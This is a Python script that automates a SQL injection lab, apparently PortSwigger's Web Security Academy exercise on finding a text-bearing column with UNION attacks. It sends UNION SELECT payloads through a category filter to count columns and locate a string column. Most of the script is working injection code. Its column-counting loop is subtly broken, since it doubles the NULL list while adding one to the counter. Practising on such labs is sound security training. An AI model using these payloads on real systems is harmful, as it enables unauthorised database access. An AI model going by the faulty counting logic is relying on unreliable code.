import requests
import sys
from bs4 import BeautifulSoup

# Solves      : SQL injection UNION attack, determining the number of columns returned by the query
# Description : We know that we have to exploit UNION based injection.
# Hint        : First we inject '+UNION+SELECT+NULL--- 
#               We have keep adding NULL values until we get a response from the server.

print("Problem Statement : Using SQL injection UNION attack, find the column containing text")
print("For Attack : First we inject \" \'+UNION+SELECT+NULL--- \" then")
print("             We have keep adding NULL values until we get a response")
print("             from the server.")
print("             Once we have, determined the number of columns in the")
print("             last lab, now we will determine which column contains")
print("             text by using UNION, we try to add a string value in ")
print("             place of NULL, if query works, we can determine the  ")
print("             type of column. \n")




#Results
def printResults(exploitUrl,columnNo):
    global columnsAvailable
    global rootURL
    print("String value is inserted in column no: "+str(columnNo))
    print("Hence, string columns is "+str(columnNo))
    print("\n")
    print("This link confirms injection exists as this shows \"Internel Server Error\":")
    print(rootURL+"/filter?category=Corporate+gifts%27+UNION+SELECT+NULL"+"--")
    print("Exploit URL : "+exploitUrl)
    print("\n\nYou you dont see the lab solved, try revisiting exploit url or please change the provided unique string.")
    exit()


#Verifying If Correct URL Is Given 
try:
    rootURL = sys.argv[1]
except:
    print("You have not Entered the root URL argument (argument 1)")
    rootURL = input("Enter The Root URL (*.web-security-academy.net):")

try:
    uniqueStringPrint = sys.argv[2]
except:
    print("You have not entered the unique string (argument 2)")
    uniqueStringPrint = input("Enter the unique string provided: ")


while True:
    try:
        while rootURL[-1] == "/":
            rootURL = rootURL[:-1]
        response = requests.get(rootURL)
        if(response.status_code != 200):
            print("Check URL/Connection")
            raise Exception()
        
        bsObj = BeautifulSoup(response.text, "html.parser")
        title = bsObj.head.title
        
        if(title.contents[0] != "SQL injection UNION attack, finding a column containing text"):
            print("Incorrect URL: Please Enter root URL of \"SQL injection UNION attack, determining the number of columns returned by the query\" Lab")
            raise Exception()
        
        break
    
    except Exception as inst:
            print(inst)
            rootURL = input("Enter The Root URL (*.web-security-academy.net):")    


#Exploit Explaination + script
print("Explioting.... \n")
response = requests.get(rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION--")
invalidResponse = response.text
injectNull = ",NULL"
columnsAvailable = 2
while True:
    url = rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+NULL"+injectNull+"--"
    response = requests.get(url)
    if(response.text != invalidResponse):
        break
    columnsAvailable = columnsAvailable + 1
    injectNull = injectNull + injectNull

print("No of columns available :"+str(columnsAvailable))

inject = "NULL,"*(columnsAvailable-1)
url = rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+\'"+uniqueStringPrint+"\',"+inject[:-1]+"--"
response = requests.get(url)
if(response.text != invalidResponse):
        printResults(url,1)
url = rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+"+inject[:-1]+",\'"+uniqueStringPrint+"\'--"
response = requests.get(url)
if(response.text != invalidResponse):
        printResults(url,columnsAvailable)
x = columnsAvailable-2
for i in range(0,x):
    inject = "NULL"+",NULL"*(i)+",\'"+uniqueStringPrint+"\'"+",NULL"*(x-i)
    url = rootURL+"/filter?category=Clothing%2c+shoes+and+accessories%27+UNION+SELECT+"+inject+"--"
    response = requests.get(url)
    if(response.text != invalidResponse):
        printResults(url,i+1)
inject = "NULL,"*(columnsAvailable-1)
#Exploit Code Ends


